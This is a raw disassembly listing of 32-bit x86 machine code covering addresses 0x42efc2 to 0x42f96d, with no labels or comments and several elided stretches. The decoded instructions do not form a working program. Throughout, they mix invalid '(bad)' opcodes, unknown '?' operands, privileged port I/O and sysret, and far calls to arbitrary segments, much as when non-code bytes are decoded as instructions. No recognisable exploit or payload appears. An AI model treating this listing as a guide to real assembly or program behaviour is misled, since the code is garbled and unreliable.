  42efc2:	test   eax,0x948d957b
  42efc7:	push   ss
  42efc8:	retf   0xa666
  42efcb:	cli    
  42efcc:	ja     0x42efd3
  42efce:	imul   ecx,DWORD PTR [eax+ebx*8-0x6d98e636],0xc6ad7e0c
  42efd9:	add    al,0x46
  42efdb:	push   esi
  42efdc:	mov    ebp,0x6339e845
  42efe1:	icebp  
  42efe2:	scas   al,BYTE PTR es:[edi]
  42efe3:	out    dx,al
  42efe4:	retf   0xbb67
  42efe7:	lds    esp,FWORD PTR [ecx-0x3c]
  42efea:	mul    ebp
  42efec:	jo     0x42ef7e
  42efee:	xor    eax,DWORD PTR [esi+0x6b]
  42eff1:	cmp    ebp,ebx
  42eff3:	lods   al,BYTE PTR ds:[esi]
  42eff4:	inc    ebx
  42eff5:	repnz push ebx
  42eff7:	shl    DWORD PTR [edi+0xec1e474],cl
  42effd:	out    0x78,al
  42efff:	fld    QWORD PTR [ebp-0x1a6ac48b]
  42f005:	dec    esi
  42f006:	mov    eax,0xc5c6f79
  42f00b:	jmp    0x42f00c
  42f00d:	push   cs
  42f00e:	ret    
  42f00f:	ja     0x42efe1
  42f011:	mov    ds:0x27f4ea3a,al
  42f016:	sbb    DWORD PTR [esi-0x1d3ecb09],0xd9e686ba
  42f020:	pop    ebx
  42f021:	mov    ?,ebx
  42f023:	pop    ecx
  42f024:	sub    eax,0x3a12efb4
  42f029:	ins    BYTE PTR es:[edi],dx
  42f02a:	rcr    DWORD PTR [ebx],cl
  42f02c:	jmp    0x5e809626
  42f031:	push   ds
  42f032:	push   ax
  42f034:	mov    DWORD PTR [eax-0x3d],eax
  42f037:	jb     0x42f083
  42f039:	aaa    
  42f03a:	adc    ch,BYTE PTR [esi-0x7a013e90]
  42f040:	adc    DWORD PTR [ebp-0x4a07dbe],esp
  42f046:	mov    edi,DWORD PTR [esi-0x6]
  42f049:	sbb    dh,BYTE PTR [edi+0x381f67e2]
  42f04f:	inc    ecx
  42f050:	lea    esp,[esi+0x31]
  42f053:	rcl    DWORD PTR [eax+0xd58db1],0x66
  42f05a:	ins    BYTE PTR es:[edi],dx
  42f05b:	mov    dh,0xc7
  42f05d:	loope  0x42f057
  42f05f:	fisubr WORD PTR [ebx-0xf]
  42f062:	fnstenv [ebx+0x1d03771c]
  42f068:	xchg   edx,eax
  42f069:	repnz push esi
  42f06b:	mov    ecx,0xdd19
	...
  42f0d4:	add    BYTE PTR [eax],al
  42f0d6:	adc    bh,BYTE PTR [esi]
  42f0d8:	int    0xe5
  42f0da:	in     eax,dx
  42f0db:	idiv   DWORD PTR [edx]
  42f0dd:	(bad)  
  42f0de:	js     0x42f0e3
  42f0e0:	mov    DWORD PTR [ecx],ecx
  42f0e2:	sbb    dh,dl
  42f0e4:	das    
  42f0e5:	loopne 0x42f14e
  42f0e7:	clc    
  42f0e8:	add    DWORD PTR [eax],eax
  42f0ea:	add    BYTE PTR [ecx],al
  42f0ec:	add    BYTE PTR [eax],al
  42f0ee:	mov    ah,0xb0
  42f0f0:	addr16 lahf 
  42f0f2:	das    
  42f0f3:	jecxz  0x42f090
  42f0f5:	cmp    ax,0x9b12
  42f0f9:	sub    ecx,edx
  42f0fb:	jg     0x42f128
  42f0fd:	xchg   ecx,eax
  42f0fe:	mov    ds:0xa743db14,eax
  42f103:	mov    ah,0x8d
  42f105:	pop    es
  42f106:	gs test al,0xbf
  42f109:	jb     0x42f0ae
  42f10b:	mov    ds:0xa68b9e36,al
  42f110:	adc    al,0x31
  42f112:	fwait
  42f113:	mov    al,bl
  42f115:	cmp    edx,ebx
  42f117:	xchg   ebx,eax
  42f118:	js     0x42f0ff
  42f11a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f11b:	sbb    DWORD PTR [esi],0xacb64b39
  42f121:	mov    ah,0x4b
  42f123:	mov    edi,0xdfe47ed
  42f128:	fwait
  42f129:	sbb    al,0xae
  42f12b:	adc    dh,BYTE PTR [ebx]
  42f12d:	adc    BYTE PTR [esi-0x1f],0x75
  42f131:	fs scas eax,DWORD PTR es:[edi]
  42f133:	aad    0x21
  42f135:	add    eax,0xbba8879c
  42f13a:	sti    
  42f13b:	sub    DWORD PTR [esi],esi
  42f13d:	add    ebx,ebp
  42f13f:	and    esi,DWORD PTR [esi]
  42f141:	sti    
  42f142:	daa    
  42f143:	stc    
  42f144:	add    BYTE PTR [ecx-0x3657044f],0xd6
  42f14b:	pop    ecx
  42f14c:	inc    ecx
  42f14d:	xor    DWORD PTR [edi+0x38],ebx
  42f150:	sbb    bl,BYTE PTR [ecx+0x30]
  42f153:	dec    ebx
  42f154:	sub    al,0xba
  42f156:	or     al,0xe2
  42f158:	xchg   DWORD PTR [edi-0x1b],ecx
  42f15b:	out    dx,al
  42f15c:	es jo  0x42f178
  42f15f:	inc    esi
  42f160:	or     eax,0x9822c812
  42f165:	jnp    0x42f170
  42f167:	inc    edx
  42f168:	test   eax,0x964c4552
  42f16d:	sub    eax,0x296ad480
  42f172:	fistp  DWORD PTR [ebx-0x40]
  42f175:	pop    edi
  42f176:	cli    
  42f177:	pop    eax
  42f178:	xchg   esp,eax
  42f179:	sbb    esp,esi
  42f17b:	call   0xbc86:0xc3e8ea6c
  42f182:	mov    bh,0x8d
  42f184:	pop    eax
  42f185:	div    eax
  42f187:	adc    eax,0x16e8db6
  42f18c:	(bad)  
  42f18d:	in     eax,dx
  42f18e:	call   0x792c:0xe52e113e
  42f195:	push   eax
  42f196:	test   BYTE PTR [ecx],0x92
  42f199:	fwait
  42f19a:	popf   
  42f19b:	jmp    0xe242:0xb7f2e29f
  42f1a2:	loope  0x42f18a
  42f1a4:	dec    ebp
  42f1a5:	mov    esp,0xb0762247
  42f1aa:	sbb    dh,ah
  42f1ac:	rol    BYTE PTR [edi+eax*2-0x16],cl
  42f1b0:	jo     0x42f187
  42f1b2:	rol    BYTE PTR [ebx],cl
  42f1b4:	cdq    
  42f1b5:	jb     0x42f16f
  42f1b7:	and    al,0x4f
  42f1b9:	inc    eax
  42f1ba:	pop    eax
  42f1bb:	outs   dx,DWORD PTR ds:[esi]
  42f1bc:	inc    DWORD PTR [ebx]
  42f1be:	dec    edx
  42f1bf:	in     al,0x1d
  42f1c1:	cmp    eax,0x297bc36c
  42f1c6:	test   al,0x1e
  42f1c8:	lea    edx,[edx]
  42f1ca:	cmp    BYTE PTR [esp+edi*4+0x64cec76b],al
  42f1d1:	mov    es,WORD PTR [edx]
  42f1d3:	mov    ds:0x180fa36d,al
  42f1d8:	cld    
  42f1d9:	(bad)  
  42f1db:	stos   BYTE PTR es:[edi],al
  42f1dc:	add    BYTE PTR [edx+0x6ff3aa85],dh
  42f1e2:	idiv   BYTE PTR [esp+esi*8]
  42f1e5:	lock xor al,0xf9
  42f1e8:	aaa    
  42f1e9:	dec    ebx
  42f1ea:	cdq    
  42f1eb:	(bad)  
  42f1ec:	and    al,0x6b
	...
  42f256:	pop    edx
  42f257:	es jecxz 0x42f29d
  42f25a:	inc    edi
  42f25c:	cli    
  42f25d:	aas    
  42f25e:	into   
  42f25f:	retf   0x3f8e
  42f262:	jne    0x42f25b
  42f264:	jno    0x42f1f4
  42f266:	addr16 stc 
  42f268:	add    DWORD PTR [eax],eax
  42f26a:	add    BYTE PTR [ecx],al
  42f26c:	add    BYTE PTR [eax],al
  42f26e:	push   0x6d
  42f270:	test   al,0x91
  42f272:	mov    ch,0xe0
  42f275:	inc    edi
  42f276:	scas   al,BYTE PTR es:[edi]
  42f277:	out    dx,al
  42f278:	cdq    
  42f279:	cmp    al,0x91
  42f27b:	jae    0x42f22b
  42f27d:	jge    0x42f2f0
  42f27f:	sub    al,0x41
  42f281:	les    ebp,FWORD PTR [ecx]
  42f283:	cmp    DWORD PTR ds:0x3dd4cf95,esi
  42f289:	push   ds
  42f28a:	scas   eax,DWORD PTR es:[edi]
  42f28b:	in     al,0x35
  42f28d:	adc    bl,dh
  42f28f:	xchg   DWORD PTR [edx],ebx
  42f291:	sysret 
  42f293:	shl    esi,cl
  42f295:	pop    es
  42f296:	icebp  
  42f297:	test   al,0x2b
  42f299:	sub    cl,BYTE PTR [edx+0x74]
  42f29c:	fisubr WORD PTR [edx]
  42f29e:	lock push ss
  42f2a0:	xchg   DWORD PTR [edx-0x67],ebp
  42f2a3:	pop    eax
  42f2a4:	in     eax,0xc0
  42f2a6:	cmp    esi,esp
  42f2a8:	rcr    BYTE PTR [esi-0x10],cl
  42f2ab:	jecxz  0x42f23d
  42f2ad:	xchg   edx,eax
  42f2ae:	(bad)  
  42f2af:	loopne 0x42f25e
  42f2b1:	and    BYTE PTR [esi-0x16],ch
  42f2b4:	push   esi
  42f2b5:	xor    BYTE PTR [ebp-0x6d],dh
  42f2b8:	dec    ebx
  42f2b9:	shl    dh,0x30
  42f2bc:	in     eax,dx
  42f2bd:	pop    edx
  42f2be:	div    BYTE PTR [eax+0x2a]
  42f2c1:	nop
  42f2c2:	cvtps2pd xmm3,xmm0
  42f2c5:	sbb    bh,ch
  42f2c7:	mov    edi,0x27d7de72
  42f2cc:	int3   
  42f2cd:	or     DWORD PTR [ebx],edx
  42f2cf:	jge    0x42f25a
  42f2d1:	xchg   edi,eax
  42f2d2:	sub    BYTE PTR ds:0x3c6bf2d0,0x92
  42f2d9:	iret   
  42f2da:	dec    eax
  42f2db:	lods   al,BYTE PTR ds:[esi]
  42f2dc:	ins    BYTE PTR es:[edi],dx
  42f2dd:	les    ebp,FWORD PTR [edx]
  42f2df:	lds    ebx,FWORD PTR [esi-0x8]
  42f2e2:	and    DWORD PTR [esi-0x28],esi
  42f2e5:	(bad)  
  42f2e6:	gs push edx
  42f2e8:	add    dl,BYTE PTR [ebx+eax*8]
  42f2eb:	mov    eax,0x96df089d
  42f2f0:	stc    
  42f2f1:	xchg   edx,eax
  42f2f2:	add    al,0x34
  42f2f4:	push   esi
  42f2f5:	test   eax,0xd6dab2c3
  42f2fa:	fs pop di
  42f2fd:	or     eax,0x580bec0a
  42f302:	(bad)  
  42f303:	aam    0x4d
  42f305:	add    dl,al
  42f307:	outs   dx,DWORD PTR ds:[esi]
  42f308:	out    0x2e,eax
  42f30a:	cmc    
  42f30b:	inc    edx
  42f30c:	and    ch,bh
  42f30e:	mov    bl,0x1d
  42f310:	pop    esi
  42f311:	mov    al,0x77
  42f313:	cld    
  42f314:	xchg   edi,eax
  42f315:	pop    edx
  42f316:	jnp    0x42f2eb
  42f318:	shr    BYTE PTR [edi+eiz*2],1
  42f31b:	pushf  
  42f31c:	aam    0xb7
  42f31e:	int3   
  42f31f:	outs   dx,BYTE PTR ds:[esi]
  42f320:	xchg   BYTE PTR [ecx],ch
  42f322:	mov    ?,WORD PTR [edx+0x1b]
  42f325:	cmp    dh,dl
  42f327:	iret   
  42f328:	(bad)  
  42f329:	addr16 add eax,0xd066739c
  42f32f:	lods   al,BYTE PTR ds:[esi]
  42f330:	push   0x26
  42f332:	mov    bh,0xe1
  42f335:	add    DWORD PTR [ecx],edi
  42f337:	je     0x42f37d
  42f339:	push   ebp
  42f33a:	xchg   esi,eax
  42f33b:	xchg   ebx,eax
  42f33c:	add    DWORD PTR [ebx-0x54],0x6c
  42f340:	xchg   esi,eax
  42f341:	jne    0x42f2fe
  42f343:	ds mov ch,0xd7
  42f346:	test   al,0x2c
  42f348:	or     ch,ch
  42f34a:	sub    edx,ecx
  42f34c:	jno    0x42f37b
  42f34e:	pop    edi
  42f34f:	mov    al,ds:0x48764ef8
  42f354:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f355:	cmp    DWORD PTR [edi],edi
  42f357:	or     eax,0xcf4ea84b
  42f35c:	sbb    BYTE PTR [edi+0x2e],dh
  42f35f:	dec    ebp
  42f360:	jo     0x42f34a
  42f362:	jns    0x42f3de
  42f364:	mov    edx,0x3448b23c
  42f369:	dec    edx
  42f36a:	or     al,0x7d
  42f36c:	inc    edx
  42f36d:	jp     0x42f36f
	...
  42f3d3:	add    BYTE PTR [eax],al
  42f3d5:	add    BYTE PTR [ebp-0x5075f7e6],bh
  42f3db:	call   0xcc3a:0x5ac03fbf
  42f3e2:	xor    DWORD PTR [eax-0x598cdd5],0x1000001
  42f3ec:	add    BYTE PTR [eax],al
  42f3ee:	dec    esi
  42f3ef:	popf   
  42f3f0:	sbb    eax,0x79e233b3
  42f3f5:	jp     0x42f454
  42f3f7:	mov    dh,0x8
  42f3f9:	add    al,0x99
  42f3fb:	(bad)  
  42f3fc:	in     eax,0xaa
  42f3fe:	gs mov bl,0x9e
  42f401:	stos   DWORD PTR es:[edi],eax
  42f402:	(bad)  
  42f403:	jns    0x42f38c
  42f405:	mov    bh,0x3c
  42f407:	in     al,0xc6
  42f409:	cwde   
  42f40a:	inc    ebp
  42f40b:	(bad)  
  42f40c:	xor    bl,BYTE PTR [edx]
  42f40e:	or     al,dh
  42f410:	stos   DWORD PTR es:[edi],eax
  42f411:	adc    al,0x76
  42f413:	outs   dx,BYTE PTR ds:[esi]
  42f414:	xor    ecx,DWORD PTR [edi-0x100f09c]
  42f41a:	jmp    0xf3a4886b
  42f41f:	or     ebx,DWORD PTR [ecx+0x674bcdb3]
  42f425:	(bad)  
  42f426:	fdivr  QWORD PTR [ebx]
  42f428:	xchg   ecx,eax
  42f429:	cmp    eax,DWORD PTR [ecx+0xb705c7d]
  42f42f:	popa   
  42f430:	mov    al,0x66
  42f432:	fiadd  WORD PTR [esp+eiz*8-0x39]
  42f437:	in     eax,0xc8
  42f439:	loopne 0x42f40d
  42f43b:	mov    dl,0x62
  42f43d:	stos   DWORD PTR es:[edi],eax
  42f43e:	fnsave [edi+0x44]
  42f441:	or     bl,BYTE PTR [ecx-0x1b7317cc]
  42f447:	mov    edi,0x9ceee535
  42f44c:	jbe    0x42f4ca
  42f44e:	dec    eax
  42f44f:	and    DWORD PTR [ecx+0xb400bf1],esp
  42f455:	mov    ah,0xb7
  42f457:	aas    
  42f458:	out    dx,eax
  42f459:	pop    esp
  42f45a:	or     al,0x91
  42f45c:	dec    ebp
  42f45d:	mov    dl,0x9c
  42f45f:	add    BYTE PTR [esi+0x38],ch
  42f462:	xor    eax,0xc8ee54ca
  42f467:	retf   
  42f468:	aam    0x8b
  42f46a:	test   al,0x7
  42f46c:	test   BYTE PTR [ecx+0x71],dh
  42f46f:	cmp    ebx,DWORD PTR [ebp+0x55cc2810]
  42f475:	and    eax,0x25d6edde
  42f47a:	out    dx,eax
  42f47b:	fisubr WORD PTR [ecx+ebx*1+0x1f]
  42f47f:	fnsave [eax]
  42f481:	xchg   esi,eax
  42f482:	push   0x1
  42f484:	in     eax,dx
  42f485:	pop    edi
  42f486:	pop    ebp
  42f487:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f488:	or     DWORD PTR [ebx],edi
  42f48a:	jl     0x42f4c6
  42f48c:	inc    esp
  42f48d:	mul    ah
  42f48f:	add    DWORD PTR [ebp-0x6f],0x16
  42f493:	sar    DWORD PTR fs:0x9f7ebfc4,cl
  42f49a:	xchg   esi,eax
  42f49b:	inc    ebp
  42f49c:	jle    0x42f4fe
  42f49e:	mov    bh,BYTE PTR [ebx+ecx*2]
  42f4a1:	ja     0x42f50b
  42f4a3:	mov    dh,0xa2
  42f4a5:	add    al,0x69
  42f4a7:	pop    ds
  42f4a8:	cmp    edi,ecx
  42f4aa:	push   cs
  42f4ab:	push   edi
  42f4ac:	and    al,0xa
  42f4ae:	or     dh,dl
  42f4b0:	(bad)  
  42f4b1:	add    al,0xf6
  42f4b3:	mov    es,WORD PTR [ebx+ebp*4-0x3b0f5ef0]
  42f4ba:	ss cdq 
  42f4bc:	mov    dh,0x1
  42f4be:	push   ebx
  42f4bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f4c0:	push   edi
  42f4c1:	inc    edx
  42f4c2:	pop    esp
  42f4c3:	add    ch,BYTE PTR [ebx+esi*1-0x70327d8]
  42f4ca:	jns    0x42f4bb
  42f4cc:	push   ebp
  42f4cd:	dec    ebp
  42f4ce:	fwait
  42f4cf:	mov    ecx,0x2579b2d9
  42f4d4:	add    BYTE PTR [ebx+ebp*2+0x4d9b56a],bh
  42f4db:	das    
  42f4dc:	cwde   
  42f4dd:	xor    DWORD PTR [esi-0x6e0cdd72],0xce1f4245
  42f4e7:	jge    0x42f519
  42f4e9:	cmp    BYTE PTR [ebp+0x226be0],dh
	...
  42f553:	add    BYTE PTR [eax],al
  42f555:	add    BYTE PTR [edi],dh
  42f557:	jae    0x42f5a3
  42f559:	cdq    
  42f55a:	dec    esi
  42f55b:	mov    ecx,0x13f4fff7
  42f560:	jno    0x42f591
  42f562:	adc    BYTE PTR [ebp-0x498a2bf],ah
  42f568:	add    DWORD PTR [eax],eax
  42f56a:	add    BYTE PTR [ecx],al
  42f56c:	add    BYTE PTR [eax],al
  42f56e:	in     eax,dx
  42f56f:	ja     0x42f5e1
  42f571:	xor    BYTE PTR ds:0xefcf45f4,0x87
  42f578:	out    0xbe,al
  42f57a:	repnz pop edi
  42f57c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f57d:	mov    bh,BYTE PTR [esi]
  42f57f:	mov    ds,WORD PTR [eax-0x5b]
  42f582:	adc    DWORD PTR [edx-0x43],edx
  42f585:	pop    ebx
  42f586:	out    dx,al
  42f587:	push   ss
  42f588:	push   ebp
  42f589:	inc    esi
  42f58a:	xor    al,0x10
  42f58c:	add    eax,DWORD PTR [edi]
  42f58e:	bound  ebp,QWORD PTR [edx-0x77]
  42f591:	mov    edi,DWORD PTR [edx-0x2dc6a855]
  42f597:	adc    DWORD PTR ds:0xdcb69e98,0x4a
  42f59e:	out    0x1f,al
  42f5a0:	fadd   DWORD PTR [edx-0x42]
  42f5a3:	adc    eax,0x47f8b456
  42f5a8:	xlat   BYTE PTR ds:[ebx]
  42f5a9:	lock aas 
  42f5ab:	adc    eax,0xea03a313
  42f5b0:	cli    
  42f5b1:	call   0x9733:0xa167659c
  42f5b8:	cld    
  42f5b9:	cmp    bh,BYTE PTR [esi-0x1b5452c4]
  42f5bf:	call   0xa1fff4db
  42f5c4:	lahf   
  42f5c5:	push   DWORD PTR [ebp-0x39]
  42f5c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f5c9:	push   edx
  42f5ca:	push   0xffffffcd
  42f5cc:	jle    0x42f5fd
  42f5ce:	cdq    
  42f5cf:	inc    ecx
  42f5d0:	ret    0x3c4
  42f5d3:	ins    DWORD PTR es:[edi],dx
  42f5d4:	sub    BYTE PTR [esi-0x1c057577],cl
  42f5da:	into   
  42f5db:	jbe    0x42f5b7
  42f5dd:	jp     0x42f5aa
  42f5df:	mov    eax,ds:0x37308221
  42f5e4:	xchg   ebp,eax
  42f5e5:	js     0x42f660
  42f5e7:	data16 ja 0x42f582
  42f5ea:	repnz pop ds
  42f5ec:	retf   
  42f5ed:	ror    BYTE PTR [ecx-0x3c],1
  42f5f0:	jnp    0x42f584
  42f5f2:	outs   dx,DWORD PTR ds:[esi]
  42f5f3:	or     BYTE PTR [eax],0x51
  42f5f6:	int    0xfb
  42f5f8:	call   0xa130:0x18c2a551
  42f5ff:	(bad)  
  42f601:	outs   dx,BYTE PTR ds:[esi]
  42f602:	add    bh,BYTE PTR [edx-0x7be4297c]
  42f608:	fs repz cld 
  42f60b:	mov    ecx,0x81f34b7f
  42f610:	push   0xd777cb56
  42f615:	pop    edi
  42f616:	fnstsw WORD PTR [eax]
  42f618:	sub    DWORD PTR [eax],esi
  42f61a:	xor    eax,0x5ed34c8f
  42f61f:	mov    dh,0x52
  42f621:	adc    edx,DWORD PTR [esi]
  42f623:	or     dh,0x55
  42f626:	jbe    0x42f657
  42f628:	xor    DWORD PTR [eax],eax
  42f62a:	out    dx,eax
  42f62b:	cdq    
  42f62c:	cli    
  42f62d:	fsub   QWORD PTR [esi-0x54409279]
  42f633:	inc    esi
  42f634:	jns    0x42f686
  42f636:	cmp    BYTE PTR [eax+edi*2+0x5a148e97],cl
  42f63d:	loope  0x42f601
  42f63f:	mov    bh,BYTE PTR [esi-0x3599fcb2]
  42f645:	cmp    al,0x23
  42f647:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f648:	(bad)  
  42f649:	lock imul ah
  42f64c:	(bad)  
  42f64d:	out    dx,eax
  42f64e:	test   DWORD PTR [eax+0x35],edx
  42f651:	pop    eax
  42f652:	xor    al,0x2b
  42f654:	jb     0x42f647
  42f656:	pop    ecx
  42f657:	push   0x7577a33a
  42f65c:	pop    ss
  42f65d:	mov    ss,esi
  42f65f:	in     eax,dx
  42f660:	push   edi
  42f661:	add    dh,BYTE PTR [edx-0x54]
  42f664:	pop    ecx
  42f665:	adc    BYTE PTR [eax+eiz*1],ah
  42f668:	push   esp
  42f669:	clc    
  42f66a:	or     BYTE PTR [edi+eax*4+0xf],bh
	...
  42f6d5:	add    BYTE PTR [esi],bh
  42f6d7:	push   esi
  42f6d8:	into   
  42f6d9:	nop
  42f6da:	out    dx,al
  42f6db:	cwde   
  42f6dc:	jle    0x42f6dc
  42f6de:	push   eax
  42f6df:	sub    edx,esi
  42f6e1:	dec    esp
  42f6e2:	mov    esi,0x6719041d
  42f6e7:	cld    
  42f6e8:	add    DWORD PTR [eax],eax
  42f6ea:	add    BYTE PTR [ecx],al
  42f6ec:	add    BYTE PTR [eax],al
  42f6ee:	sbb    BYTE PTR [ecx-0x6c5cddbc],0xa7
  42f6f5:	inc    ecx
  42f6f6:	xchg   ecx,eax
  42f6f7:	dec    ebp
  42f6f8:	xchg   ebx,eax
  42f6f9:	xor    eax,0xa25053cc
  42f6fe:	cmc    
  42f6ff:	into   
  42f700:	pusha  
  42f701:	int3   
  42f702:	add    eax,0x30fbc44f
  42f707:	dec    ebp
  42f708:	fisttp QWORD PTR [edi+0x4fdc3476]
  42f70e:	mov    ecx,0xe7f14d2d
  42f713:	iret   
  42f714:	mov    ?,WORD PTR ds:0xd7689701
  42f71a:	scas   eax,DWORD PTR es:[edi]
  42f71b:	ret    0x44e1
  42f71e:	(bad)  
  42f71f:	scas   eax,DWORD PTR es:[edi]
  42f720:	jbe    0x42f787
  42f722:	adc    eax,0x3db48fa1
  42f727:	int    0x89
  42f729:	add    ebx,DWORD PTR [ebx]
  42f72b:	fwait
  42f72c:	aad    0x2d
  42f72e:	pop    es
  42f72f:	mov    eax,0xc7777a8a
  42f734:	jmp    0x1c4cf9bd
  42f739:	call   0xb855:0x520f3119
  42f740:	xor    al,0x57
  42f742:	and    eax,0x51d35acc
  42f747:	loope  0x42f74b
  42f749:	lock int3 
  42f74b:	xlat   BYTE PTR ds:[ebx]
  42f74c:	aas    
  42f74d:	pop    esi
  42f74e:	stos   BYTE PTR es:[edi],al
  42f74f:	lahf   
  42f750:	pop    ds
  42f751:	cs jnp 0x42f7c1
  42f754:	jl     0x42f72d
  42f756:	je     0x42f7ae
  42f758:	out    0x60,al
  42f75a:	pop    ds
  42f75b:	clc    
  42f75c:	cs adc eax,0xca4ac0a7
  42f762:	in     al,0x3f
  42f764:	mov    dl,dh
  42f766:	mov    ebx,0xd7fd835a
  42f76b:	out    dx,al
  42f76c:	nop
  42f76d:	sub    dl,BYTE PTR [edx+0x51]
  42f770:	push   ebp
  42f771:	int    0x26
  42f773:	fs pop esp
  42f775:	cld    
  42f776:	fs ins BYTE PTR es:[edi],dx
  42f778:	nop
  42f779:	mov    edi,0x622b2ac9
  42f77e:	fmul   DWORD PTR [edi-0x5b]
  42f781:	jg     0x42f75b
  42f783:	or     ah,BYTE PTR [edi]
  42f785:	sar    BYTE PTR ds:0x85f559d3,0x65
  42f78c:	mov    eax,ds:0x423145cd
  42f791:	jnp    0x42f804
  42f793:	mov    al,ds:0x3203a5de
  42f798:	scas   al,BYTE PTR es:[edi]
  42f799:	imul   BYTE PTR [edi+0x50]
  42f79c:	mov    cl,0xcc
  42f79e:	cs jno 0x42f72b
  42f7a1:	add    al,0x90
  42f7a3:	daa    
  42f7a4:	add    al,0x1f
  42f7a6:	cld    
  42f7a7:	dec    ebx
  42f7a8:	jo     0x42f767
  42f7aa:	in     al,0xc9
  42f7ac:	inc    eax
  42f7ad:	loopne 0x42f817
  42f7af:	mov    ebx,0x21a7c35f
  42f7b4:	inc    ebx
  42f7b5:	inc    ebx
  42f7b6:	xlat   BYTE PTR ds:[ebx]
  42f7b7:	popa   
  42f7b8:	out    dx,eax
  42f7b9:	aam    0x95
  42f7bb:	or     BYTE PTR [eax-0x13],0xc4
  42f7bf:	and    al,0xd9
  42f7c1:	or     eax,0x6150cca0
  42f7c6:	add    bl,al
  42f7c8:	cdq    
  42f7c9:	es in  eax,0x83
  42f7cc:	shl    BYTE PTR [edi-0x5f3a3587],0x51
  42f7d3:	push   ds
  42f7d4:	fstp   st(3)
  42f7d6:	(bad)  
  42f7d7:	xlat   BYTE PTR ds:[ebx]
  42f7d8:	fistp  WORD PTR [esp+ebx*4]
  42f7db:	pop    ebp
  42f7dc:	sub    al,0xd1
  42f7de:	dec    edi
  42f7df:	sbb    BYTE PTR [ebx+edx*4-0x3fa4cc1e],ch
  42f7e6:	jbe    0x42f83d
  42f7e8:	inc    edi
  42f7e9:	pop    ecx
  42f7ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f7eb:	inc    edi
  42f7ec:	xchg   edx,eax
  42f7ed:	xor    al,BYTE PTR [eax]
	...
  42f853:	add    BYTE PTR [eax],al
  42f855:	add    BYTE PTR [ecx-0x5f],dh
  42f858:	(bad)  
  42f859:	test   al,0xd6
  42f85b:	(bad)  
  42f85c:	jg     0x42f857
  42f85e:	push   cs
  42f85f:	pop    ebp
  42f860:	push   ebp
  42f861:	mov    edi,0xba5d2f23
  42f866:	addr16 std 
  42f868:	add    DWORD PTR [eax],eax
  42f86a:	add    BYTE PTR [ecx],al
  42f86c:	add    BYTE PTR [eax],al
  42f86e:	ins    BYTE PTR es:[edi],dx
  42f86f:	push   esp
  42f870:	xor    BYTE PTR [eax+0x5e],ch
  42f873:	inc    edi
  42f874:	push   edi
  42f875:	push   edi
  42f876:	cs sar edx,cl
  42f879:	loope  0x42f8d2
  42f87b:	or     bl,dh
  42f87d:	jge    0x42f8cf
  42f87f:	ins    BYTE PTR es:[di],dx
  42f881:	mov    esi,0x53b8124d
  42f886:	jl     0x42f832
  42f888:	idiv   esp
  42f88a:	imul   esp,DWORD PTR [edx-0x69],0x59c6ea3c
  42f891:	repz enter 0x3b98,0x50
  42f896:	and    al,0xcb
  42f898:	and    eax,0x94e885dc
  42f89d:	push   es
  42f89e:	mov    dl,0x51
  42f8a0:	popa   
  42f8a1:	inc    ebp
  42f8a2:	imul   ebx,DWORD PTR [eax],0xcd28b5d7
  42f8a8:	inc    esi
  42f8a9:	shl    DWORD PTR [edx-0x463fdeb5],0x6f
  42f8b0:	push   edx
  42f8b1:	inc    esi
  42f8b2:	jno    0x42f8fb
  42f8b4:	xchg   edi,eax
  42f8b5:	jnp    0x95829d26
  42f8bb:	lds    eax,FWORD PTR ds:0x7248d2b
  42f8c1:	sbb    BYTE PTR [ecx+0x61],0xee
  42f8c5:	mov    cl,0x99
  42f8c7:	popa   
  42f8c8:	(bad)  
  42f8ca:	lods   eax,DWORD PTR ds:[esi]
  42f8cb:	inc    ecx
  42f8cc:	inc    eax
  42f8cd:	sub    al,0x42
  42f8cf:	jle    0x42f8ca
  42f8d1:	jae    0x42f8de
  42f8d3:	xor    BYTE PTR [eax-0x8bec04e],bl
  42f8d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f8da:	sbb    DWORD PTR [eax*4-0x124754ea],edx
  42f8e1:	mov    es,WORD PTR [ecx+0x7c4f2886]
  42f8e7:	xchg   ebx,eax
  42f8e8:	in     al,0x7
  42f8ea:	out    dx,eax
  42f8eb:	add    esp,esp
  42f8ed:	fstp   TBYTE PTR [edx]
  42f8ef:	push   ebx
  42f8f0:	mov    ebx,0x2f75ecfb
  42f8f5:	cdq    
  42f8f6:	and    DWORD PTR [edi+0x651135c4],eax
  42f8fc:	jg     0x42f8b1
  42f8fe:	int    0xdd
  42f900:	ja     0x42f97a
  42f902:	mov    eax,0x5cbd5c6
  42f907:	xor    esp,ebp
  42f909:	pop    esp
  42f90a:	xor    eax,0xe2b05aaa
  42f90f:	in     al,0x42
  42f911:	inc    ecx
  42f912:	mov    edi,0x9e3e9f33
  42f917:	iret   
  42f918:	leave  
  42f919:	stos   BYTE PTR es:[edi],al
  42f91a:	ins    DWORD PTR es:[edi],dx
  42f91b:	rcl    DWORD PTR [esi-0x5b],cl
  42f91e:	adc    al,0xe5
  42f920:	jns    0x42f8f9
  42f922:	out    0x3d,eax
  42f924:	xchg   edx,eax
  42f925:	nop
  42f926:	dec    esi
  42f927:	push   edi
  42f928:	xor    BYTE PTR [edx+0x3372386f],0xc2
  42f92f:	push   ebp
  42f930:	and    eax,0x28892804
  42f935:	cli    
  42f936:	dec    eax
  42f937:	push   0xffffff8c
  42f939:	cld    
  42f93a:	push   ebx
  42f93b:	test   DWORD PTR [edx+0x6dec4a89],ebp
  42f941:	jl     0x42f939
  42f943:	sahf   
  42f944:	or     esp,esi
  42f946:	sub    ebx,DWORD PTR [eax+0x7b0e09d3]
  42f94c:	ror    DWORD PTR [ebp+0x6981012],1
  42f952:	rol    al,cl
  42f954:	shl    DWORD PTR [esi+0x7df90ad2],0xf8
  42f95b:	inc    eax
  42f95c:	into   
  42f95d:	mov    ?,eax
  42f95f:	mov    dl,0x16
  42f961:	mov    dl,0x65
  42f963:	setg   BYTE PTR [ecx]
  42f966:	daa    
  42f967:	inc    edi
  42f968:	mov    bl,0x55
  42f96a:	data16 xor bl,BYTE PTR [edx]
  42f96d:	jmp    0x42f972
	...
